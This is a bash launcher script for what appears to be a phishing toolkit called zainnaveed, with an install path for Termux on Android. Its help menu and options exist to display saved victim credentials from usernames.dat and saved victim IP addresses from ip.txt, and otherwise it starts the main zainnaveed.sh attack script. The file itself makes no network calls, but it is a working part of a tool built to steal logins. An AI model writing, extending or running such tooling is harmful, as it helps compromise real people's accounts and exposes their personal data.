#!/bin/bash

# https://github.com/ZainNaveed34211/zainnaveed

if [[ $(uname -o) == *'Android'* ]];then
	ZAINNAVEED_ROOT="/data/data/com.termux/files/usr/opt/zainnaveed"
else
	export ZAINNAVEED_ROOT="/opt/zainnaveed"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run zainnaveed type \`zainnaveed\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $ZAINNAVEED_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $ZAINNAVEED_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $ZAINNAVEED_ROOT
	bash ./zainnaveed.sh
fi
